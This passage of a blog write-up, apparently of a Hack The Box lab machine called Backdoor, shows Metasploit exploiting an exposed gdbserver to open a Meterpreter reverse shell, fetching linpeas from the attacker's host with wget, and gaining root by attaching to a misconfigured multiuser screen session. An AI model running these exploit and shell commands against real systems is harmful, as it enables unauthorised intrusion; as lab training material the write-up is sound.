   ----   ---------------  --------  -----------
   LHOST  110.175.1.101    yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   <span style="color:#ae81ff">0</span>   x86 <span style="color:#f92672">(</span>32-bit<span style="color:#f92672">)</span>


msf6 exploit<span style="color:#f92672">(</span>multi/gdb/gdb_server_exec<span style="color:#f92672">)</span> &gt; set LHOST tun0
LHOST <span style="color:#f92672">=</span>&gt; tun0
msf6 exploit<span style="color:#f92672">(</span>multi/gdb/gdb_server_exec<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">9091</span>
LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">9091</span>
msf6 exploit<span style="color:#f92672">(</span>multi/gdb/gdb_server_exec<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.11.125
RHOSTS <span style="color:#f92672">=</span>&gt; 10.10.11.125
msf6 exploit<span style="color:#f92672">(</span>multi/gdb/gdb_server_exec<span style="color:#f92672">)</span> &gt; set RPORT <span style="color:#ae81ff">1337</span>
RPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1337</span>
msf6 exploit<span style="color:#f92672">(</span>multi/gdb/gdb_server_exec<span style="color:#f92672">)</span> &gt; set payload payload/linux/x64/meterpreter/reverse_tcp
payload <span style="color:#f92672">=</span>&gt; linux/x64/meterpreter/reverse_tcp
msf6 exploit<span style="color:#f92672">(</span>multi/gdb/gdb_server_exec<span style="color:#f92672">)</span> &gt; show targets

Exploit targets:

   Id  Name
   --  ----
   <span style="color:#ae81ff">0</span>   x86 <span style="color:#f92672">(</span>32-bit<span style="color:#f92672">)</span>
   <span style="color:#ae81ff">1</span>   x86_64 <span style="color:#f92672">(</span>64-bit<span style="color:#f92672">)</span>


msf6 exploit<span style="color:#f92672">(</span>multi/gdb/gdb_server_exec<span style="color:#f92672">)</span> &gt; set target <span style="color:#ae81ff">1</span>
target <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
msf6 exploit<span style="color:#f92672">(</span>multi/gdb/gdb_server_exec<span style="color:#f92672">)</span> &gt; run

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.206:9091 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.11.125:1337 - Performing handshake with gdbserver...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.11.125:1337 - Stepping program to find PC...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.11.125:1337 - Writing payload at 00007ffff7fd0103...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.11.125:1337 - Executing the payload...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">3020772</span> bytes<span style="color:#f92672">)</span> to 10.10.11.125
ls
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.206:9091 -&gt; 10.10.11.125:56924 <span style="color:#f92672">)</span> at 2022-05-06 21:09:28 +0100

meterpreter &gt; cat user.txt
</code></pre></div><p>yay! so we are in and we&rsquo;ve got the user flag</p>
<h2 id="privilege-escalation--root">
  Privilege Escalation | ROOT
  <a href="#privilege-escalation--root" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>lets try listing the processes running on the machine.</p>
<p>im gonna give <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20220504" target="_blank">linpeas</a>
 a try.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo python3 -m http.server <span style="color:#ae81ff">80</span>                
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
10.10.11.125 - - <span style="color:#f92672">[</span>06/May/2022 21:32:44<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /linpeas.sh HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget http://10.10.14.206/linpeas.sh
wget http://10.10.14.206/linpeas.sh
--2022-05-06 20:32:45--  http://10.10.14.206/linpeas.sh
Connecting to 10.10.14.206:80... connected.
HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
Length: <span style="color:#ae81ff">776423</span> <span style="color:#f92672">(</span>758K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/x-sh<span style="color:#f92672">]</span>
Saving to: ‘linpeas.sh’

linpeas.sh          100%<span style="color:#f92672">[===================</span>&gt;<span style="color:#f92672">]</span> 758.23K  92.4KB/s    in 8.9s    

2022-05-06 20:32:54 <span style="color:#f92672">(</span>85.6 KB/s<span style="color:#f92672">)</span> - ‘linpeas.sh’ saved <span style="color:#f92672">[</span>776423/776423<span style="color:#f92672">]</span>
</code></pre></div><p>lets run it now. after giving it the execute permissions</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod +x linpeas.sh
</code></pre></div><p>after a while the following caught my attention.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root         <span style="color:#ae81ff">820</span>  0.0  0.1   <span style="color:#ae81ff">8352</span>  <span style="color:#ae81ff">3400</span> ?        S    05:20   0:00  _ /usr/sbin/CRON -f
root         <span style="color:#ae81ff">834</span>  0.0  0.0   <span style="color:#ae81ff">2608</span>  <span style="color:#ae81ff">1796</span> ?        Ss   05:20   0:15      _ /bin/sh -c <span style="color:#66d9ef">while</span> true;<span style="color:#66d9ef">do</span> sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; <span style="color:#66d9ef">done</span>
root      <span style="color:#ae81ff">140953</span>  0.0  0.0   <span style="color:#ae81ff">5476</span>   <span style="color:#ae81ff">592</span> ?        S    20:36   0:00          _ sleep <span style="color:#ae81ff">1</span>
daemon<span style="color:#f92672">[</span>0m       <span style="color:#ae81ff">849</span>  0.0  0.1   <span style="color:#ae81ff">3792</span>  <span style="color:#ae81ff">2232</span> ?        Ss   05:20   0:00 /usr/sbin/atd -f
root         <span style="color:#ae81ff">898</span>  0.0  0.9 <span style="color:#ae81ff">194048</span> <span style="color:#ae81ff">18360</span> ?        Ss   05:20   0:02 /usr/sbin/apache2 -k start
www-data  <span style="color:#ae81ff">126911</span>  1.7  1.6 <span style="color:#ae81ff">195360</span> <span style="color:#ae81ff">33216</span> ?        S    19:26   1:15  _ /usr/sbin/apache2 -k start
www-data  <span style="color:#ae81ff">126942</span>  1.7  1.7 <span style="color:#ae81ff">197896</span> <span style="color:#ae81ff">34672</span> ?        S    19:26   1:13  _ /usr/sbin/apache2 -k start
www-data  <span style="color:#ae81ff">126959</span>  2.1  1.6 <span style="color:#ae81ff">197508</span> <span style="color:#ae81ff">33948</span> ?        S    19:26   1:31  _ /usr/sbin/apache2 -k start
www-data  <span style="color:#ae81ff">126980</span>  1.9  1.7 <span style="color:#ae81ff">197532</span> <span style="color:#ae81ff">34648</span> ?        S    19:26   1:22  _ /usr/sbin/apache2 -k start
www-data  <span style="color:#ae81ff">126992</span>  1.7  1.7 <span style="color:#ae81ff">197908</span> <span style="color:#ae81ff">34420</span> ?        S    19:26   1:12  _ /usr/sbin/apache2 -k start
www-data  <span style="color:#ae81ff">127212</span>  2.0  1.7 <span style="color:#ae81ff">197884</span> <span style="color:#ae81ff">35196</span> ?        S    19:28   1:26  _ /usr/sbin/apache2 -k start
www-data  <span style="color:#ae81ff">127231</span>  1.9  1.7 <span style="color:#ae81ff">197896</span> <span style="color:#ae81ff">34624</span> ?        S    19:28   1:22  _ /usr/sbin/apache2 -k start
www-data  <span style="color:#ae81ff">135526</span>  1.8  1.7 <span style="color:#ae81ff">197664</span> <span style="color:#ae81ff">34440</span> ?        R    20:18   0:20  _ /usr/sbin/apache2 -k start
www-data  <span style="color:#ae81ff">135686</span>  1.8  1.7 <span style="color:#ae81ff">197760</span> <span style="color:#ae81ff">34300</span> ?        S    20:19   0:19  _ /usr/sbin/apache2 -k start
www-data  <span style="color:#ae81ff">136372</span>  2.2  1.6 <span style="color:#ae81ff">197516</span> <span style="color:#ae81ff">33060</span> ?        S    20:23   0:17  _ /usr/sbin/apache2 -k start
root         <span style="color:#ae81ff">908</span>  0.0  0.0   <span style="color:#ae81ff">5828</span>  <span style="color:#ae81ff">1748</span> tty1     Ss+  05:20   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root         <span style="color:#ae81ff">915</span>  0.0  0.3 <span style="color:#ae81ff">232716</span>  <span style="color:#ae81ff">6832</span> ?        Ssl  05:20   0:00 /usr/lib/policykit-1/polkitd --no-debug
user         <span style="color:#ae81ff">917</span>  0.0  0.4  <span style="color:#ae81ff">18388</span>  <span style="color:#ae81ff">9528</span> ?        Ss   05:20   0:00 /lib/systemd/systemd --user
user         <span style="color:#ae81ff">928</span>  0.0  0.1 <span style="color:#ae81ff">103336</span>  <span style="color:#ae81ff">3372</span> ?        S    05:20   0:00  _ <span style="color:#f92672">(</span>sd-pam<span style="color:#f92672">)</span>
root         <span style="color:#ae81ff">926</span>  0.0  0.1   <span style="color:#ae81ff">7084</span>  <span style="color:#ae81ff">2544</span> ?        Ss   05:20   0:00 SCREEN -dmS root
root         <span style="color:#ae81ff">929</span>  0.0  0.2   <span style="color:#ae81ff">8272</span>  <span style="color:#ae81ff">5088</span> pts/0    Ss+  05:20   0:00  _ -/bin/bash
mysql        <span style="color:#ae81ff">936</span>  0.6 20.4 <span style="color:#ae81ff">1760400</span> <span style="color:#ae81ff">410828</span> ?      Ssl  05:20   5:53 /usr/sbin/mysqld
root       <span style="color:#ae81ff">82046</span>  0.0  0.4 <span style="color:#ae81ff">249540</span>  <span style="color:#ae81ff">9688</span> ?        Ssl  14:31   0:00 /usr/lib/upower/upowerd
user      <span style="color:#ae81ff">102309</span>  0.0  0.0   <span style="color:#ae81ff">2608</span>   <span style="color:#ae81ff">540</span> ?        S    16:46   0:00 /bin/sh
user      <span style="color:#ae81ff">102445</span>  0.0  0.4  <span style="color:#ae81ff">15960</span>  <span style="color:#ae81ff">9544</span> ?        S    16:47   0:00  _ python3 -c import pty;pty.spawn<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/bin/bash&#39;</span><span style="color:#f92672">)</span>
user      <span style="color:#ae81ff">102448</span>  0.0  0.2   <span style="color:#ae81ff">8364</span>  <span style="color:#ae81ff">4728</span> pts/1    Ss   16:47   0:00      _ /bin/bash
root      <span style="color:#ae81ff">102663</span>  0.0  0.1   <span style="color:#ae81ff">7048</span>  <span style="color:#ae81ff">2956</span> pts/1    S+   16:48   0:00          _ screen -x root root
</code></pre></div><p>to confirm i ran ps command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">user@Backdoor:~$ ps aux | grep screen
ps aux | grep screen
root         <span style="color:#ae81ff">834</span>  0.0  0.0   <span style="color:#ae81ff">2608</span>  <span style="color:#ae81ff">1796</span> ?        Ss   05:20   0:15 /bin/sh -c <span style="color:#66d9ef">while</span> true;<span style="color:#66d9ef">do</span> sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root <span style="color:#ae81ff">\;</span>; <span style="color:#66d9ef">done</span>
root      <span style="color:#ae81ff">102663</span>  0.0  0.1   <span style="color:#ae81ff">7048</span>  <span style="color:#ae81ff">2956</span> pts/1    S+   16:48   0:00 screen -x root root
user      <span style="color:#ae81ff">154185</span>  0.0  0.0   <span style="color:#ae81ff">6632</span>   <span style="color:#ae81ff">732</span> pts/3    S+   20:41   0:00 grep --color<span style="color:#f92672">=</span>auto screen
</code></pre></div><p>There is a cronjob running with the name of <strong>screen</strong> as root</p>
<p>lets check if the screen session is running</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">user@Backdoor:~$ screen -ls root/
screen -ls root/
There is a suitable screen on:
	926.root	<span style="color:#f92672">(</span>05/06/22 05:20:35<span style="color:#f92672">)</span>	<span style="color:#f92672">(</span>Multi, attached<span style="color:#f92672">)</span>
<span style="color:#ae81ff">1</span> Socket in /run/screen/S-root.
</code></pre></div><p>so, yeah its running with mutliuser support lets try resume to the root session if possible.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">user@Backdoor:~$ screen -r root/
</code></pre></div><p>We are in! as root.</p>
<pre tabindex="0"><code>root@Backdoor:~# ls
root.txt
root@Backdoor:~# cat root.txt
</code></pre><p>and we&rsquo;ve got the flag!</p>
<blockquote>
<p>why is that work because there is a misconfiguration at the <strong>.screenrc</strong> file that contains the multiuser on, and a acladd line for the user we was in <strong>user</strong>.</p>
</blockquote>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
            
              <span class="button next">
                <a href="https://werz.info/blog/12/10/2022/postal/">
                  <span class="button__text">GDG-2022 -- Postal</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">© 2022 Powered by Hugo</div>
      
  </div>
</footer>

<script src="https://werz.info/blog/assets/main.js"></script>
<script src="https://werz.info/blog/assets/prism.js"></script>


      
    </div>

    
      
<script async src="https://www.googletagmanager.com/gtag/js?id=G-R2DLLBQDPX"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-R2DLLBQDPX', { 'anonymize_ip': false });
}
</script>

    
  </body>
</html>
